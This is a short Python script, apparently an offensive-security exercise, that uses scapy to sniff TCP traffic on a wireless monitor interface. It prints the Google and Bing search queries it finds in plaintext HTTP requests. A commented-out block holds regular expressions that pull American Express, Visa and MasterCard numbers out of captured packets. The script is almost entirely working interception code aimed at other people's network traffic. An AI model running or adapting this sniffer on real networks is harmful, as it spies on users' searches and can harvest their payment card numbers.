from scapy.all import *
import re

def findCreditCard(pkt):
	#raw= pkt.sprintf('%Raw.load%')
	#print raw
	raw=""
	if pkt.haslayer(Raw):
	  payload= pkt.getlayer(Raw).load
	  #print payload
	  raw = payload

	  if 'GET' in payload:
	    if 'google' in payload:
		r=re.findall(r'(?i)\&q=(.*?)\&', payload)
		if r:
		  search=r[0].split('&')[0]
		  search= search.replace('q=','').replace('+',' ').replace('%20',' ')	
		  print '[+] Searched for : ' + search

	  if 'GET' in payload:
		if 'bing' in payload:
		  d=re.findall('&qry=(.*?)&',payload)
		  if d:
 	  	    print '[+] searched in BING : ' + d[0]
	'''
	  
	americaRE = re.findall("3[47][0-9]{13}",raw)
	master = re.findall("5[1-5][0-9]{14}",raw)
	visa = re.findall("4[0-9]{12}(?:[0-9]{3})?",raw)

	if americaRE:
	  print '[+] Found American Express Card: '+ americaRE[0]
	if visa:
          print '[+] Found Visa Card: '+ visa[0]
	if master:
          print '[+] Found Master Card: '+ master[0]
	
	'''
	'''
	if pkt.haslayer(IP):
	  ipdst = pkt.getlayer(IP).dst
	  if (ipdst)=="192.168.0.115":
		if (pkt).haslayer(TCP):
		  if (pkt.getlayer(TCP).dport==80):
			print "yes"
	'''
	
	#pktPrint(pkt)
	  
 	

def pktPrint(pkt):

	if pkt.haslayer(Dot11Beacon):
	  print "[+] Detected 802.11 Beacon frame"
	elif pkt.haslayer(Dot11ProbeReq):
	  print "[+] Detected 802.11 probe request frame"
	elif pkt.haslayer(TCP):
	 print "[+] Detected a TCP Packet"
	elif pkt.haslayer(DNS):
	 print "[+] Detected a DNS Packet"


conf.iface = 'mon0'
sniff (filter = 'tcp',prn=findCreditCard, store=0)
